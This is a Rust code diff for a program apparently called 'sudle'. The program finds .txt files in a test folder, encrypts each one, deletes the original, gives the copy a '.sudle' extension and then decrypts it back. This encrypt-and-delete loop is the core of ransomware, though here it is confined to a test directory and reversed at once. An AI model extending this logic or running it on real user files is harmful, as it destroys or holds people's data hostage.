@@ -20,13 +20,13 @@ fn main() {
     let full = format!("{home}/projects/sudle/test_files", home = home.display());
     let paths = search_txt_files(&full);
     for file_path in paths {
-        let output_file_path = format!("{}_encrypted", file_path);
+        let output_file_path = format!("{}.sudle", file_path);
         match encrypt_delete(&file_path, &output_file_path, &key) {
             Ok(path) => {
-                decrypt_file(path.as_str(), file_path.as_str(), &key).map_or_else(
-                    |_| format!("Error decrypting {}", file_path),
-                    |_| format!("Decrypted {}", file_path),
-                );
+                match decrypt_delete(path.as_str(), file_path.as_str(), &key){
+                    Ok(file_path) => println!("{} processed successfully", file_path),
+                    Err(e) => println!("Error processing {}: {:?}", file_path, e),
+                }
             }
             Err(e) => println!("Error processing {}: {:?}", file_path, e),
         }
@@ -96,21 +96,21 @@ fn encrypt_delete(
     output_file.write_all(&buffer).expect("could not write encrypted file");
     match fs::remove_file(input_file_path){
         Ok(_) => Ok(output_file_path.to_string()),
-        Err(_) => Err("could not delet file".to_string()),
+        Err(_) => Err("could not delete file".to_string()),
     }
 }
 
-fn decrypt_file(
+fn decrypt_delete(
     input_file_path: &str,
     output_file_path: &str,
     key: &[u8; 32],
-) -> Result<(), String> {
+) -> Result<String, String> {
     // Open the input file and read its contents
     let mut input_file = File::open(input_file_path).expect("could not open file");
     let mut contents = Vec::new();
     input_file.read_to_end(&mut contents).expect("could not read file");
 
-    let output_file_path = remove_suffix(input_file_path, "_encrypted");
+    let output_file_path = remove_suffix(input_file_path, ".sudle");
     // Extract the nonce and the encrypted contents
     let (nonce, encrypted) = contents.split_at(16);
 
@@ -122,10 +122,10 @@ fn decrypt_file(
     cipher.clone().apply_keystream(&mut buffer);
 
     // Open the output file and write the decrypted contents
-    let mut output_file = File::create(output_file_path).expect("could not create file");
+    let mut output_file = File::create(output_file_path.clone()).expect("could not create file");
     output_file.write_all(&buffer).expect("could not encrypt file");
     match fs::remove_file(input_file_path){
-        Ok(_) => Ok(()),
+        Ok(_) => Ok(output_file_path.to_string()),
         Err(_) => Err("could not delete file".to_string()),
     }
 }
